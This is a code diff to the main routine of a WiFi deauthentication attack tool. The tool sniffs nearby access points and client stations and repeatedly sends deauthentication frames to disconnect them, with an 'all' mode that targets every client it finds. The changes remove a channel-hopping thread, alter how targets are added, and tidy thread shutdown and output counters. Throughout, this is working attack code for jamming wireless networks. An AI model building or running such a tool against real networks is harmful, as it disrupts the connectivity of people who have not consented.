@@ -48,7 +48,6 @@ void quit(int);
 atomic_bool working;
 atomic_bool deauth_done;
 atomic_bool sniffer_done;
-atomic_bool channel_done;
 condition_variable cond;
 vector<DeauthClient> specify;
 vector<DeauthClient> deauth;
@@ -90,7 +89,7 @@ int main(int argc, const char * argv[]) {
             }
             case 'h' : {
                 fprintf(stdout, "%s [-a|--all] [-i|--ifname " DEFAULT_WLAN "] [-b|--bssid BB:BB:BB:BB:BB:BB] [-m|--mac CC:CC:CC:CC:CC:CC] [-s|--specify CC:CC:CC:CC:CC:CC@BB:BB:BB:BB:BB:BB] [-w|--whitelist CC:CC:CC:CC:CC:CC]\nUse at your own risk & don't be jerk!\n", argv[0]);
-                break;
+                return 0;
             }
             case 's' : {
                 char * mac_str = NULL, * bssid_str = NULL;
@@ -132,7 +131,6 @@ int main(int argc, const char * argv[]) {
     if (ifname.open() && (deauth.size() + specify.size() > 0 || all)) {
         working = true;
         deauth_done = false;
-        channel_done = false;
         sniffer_done = false;
         signal(SIGINT, quit);
         
@@ -167,7 +165,7 @@ int main(int argc, const char * argv[]) {
                     }
                     
                     if (has_client) {
-                        if (!std::any_of(whitelist.begin(), whitelist.end(), [&station](const STA & _) -> bool {
+                        if (!any_of(whitelist.begin(), whitelist.end(), [&station](const STA & _) -> bool {
                             if (_._mac->is_equal(*station._mac)) {
                                 return true;
                             }
@@ -176,7 +174,7 @@ int main(int argc, const char * argv[]) {
                             {
                                 lock_guard<mutex> locker(global_mtx);
                                 
-                                if (!std::any_of(APs.begin(), APs.end(), [&ap](const AP & _) -> bool {
+                                if (!any_of(APs.begin(), APs.end(), [&ap](const AP & _) -> bool {
                                     if (_._mac->is_equal(*ap._mac)) {
                                         return true;
                                     }
@@ -185,20 +183,14 @@ int main(int argc, const char * argv[]) {
                                     APs.emplace_back(ap);
                                 }
                                 
-                                if (!std::any_of(stations.begin(), stations.end(), [&station](const STA & _) -> bool {
+                                if (!any_of(stations.begin(), stations.end(), [&station](const STA & _) -> bool {
                                     if (_._mac->is_equal(*station._mac)) {
                                         return true;
                                     }
                                     return false;
                                 })) {
                                     stations.emplace_back(station);
-                                }
-                                
-                                deauth.erase(deauth.begin(), deauth.end());
-                                for (AP & ap : APs) {
-                                    for (STA & station : stations) {
-                                        deauth.emplace_back(DeauthClient(ap, station));
-                                    }
+                                    deauth.emplace_back(DeauthClient(ap, station));
                                 }
                             }
                         }
@@ -211,57 +203,41 @@ int main(int argc, const char * argv[]) {
         
         uint64_t count = 0;
         fprintf(stdout, "\n");
-        std::thread worker{[&count, &ifname]{
+        thread worker([&count, &ifname]{
             while (working) {
                 {
                     lock_guard<mutex> locker(global_mtx);
                     
                     for (auto iter = specify.begin(); iter != specify.end(); iter++) {
+                        if (!working) break;
                         DeauthClient & client = *iter;
                         client.deauth(ifname);
                         count++;
                     }
                     
                     for (auto iter = deauth.begin(); iter != deauth.end(); iter++) {
+                        if (!working) break;
                         DeauthClient & client = *iter;
                         client.deauth(ifname);
                         count++;
                     }
-                    fprintf(stdout, "%llu deauthentication packets sent!\r", count);
+                    if (!working) break;
+                    fprintf(stdout, "%llu deauthentication packets sent! [STA: %lu, AP: %lu]\r", count, stations.size(), APs.size());
                     fflush(stdout);
-                }
-                if (!working) {
-                    deauth_done = true;
-                    return;
                 }
                 usleep(5000);
             }
-        }};
-        
-        std::thread channel_change([&]{
-            while (working) {
-#if defined(__APPLE__)
-                vector<uint8_t> channels = {1,2,3,4,5,6,7,8,9,10,11,12,13,36,40,44,48,52,56,60,64,149,153,157,161,165};
-#elif defined(__RASPBIAN__)
-                vector<uint8_t> channels = {1,2,3,4,5,6,7,8,9,10,11};
-#endif
-                for (uint8_t chan : channels) {
-                    if (!working) channel_done = true;
-                    ifname.setChannel(chan);
-                    sleep(1);
-                }
-            }
+            deauth_done = true;
         });
+
         
-        std::mutex mtx;
-        std::thread ([&]{
-            std::unique_lock<std::mutex> lock(mtx);
+        mutex mtx;
+        thread ([&]{
+            unique_lock<mutex> lock(mtx);
             cond.wait(lock);
-            working = false;
+            fprintf(stdout, "\r%llu deauthentication packets sent in total! [STA: %lu, AP: %lu]\n", count, stations.size(), APs.size());
+            while (!deauth_done || !sniffer_done) this_thread::yield();
             worker.join();
-            channel_change.join();
-            fprintf(stdout, "\r%llu deauthentication packets sent in total!\n", count);
-            while (!deauth_done || !channel_done || !sniffer_done) this_thread::yield();
         }).join();
     }
     
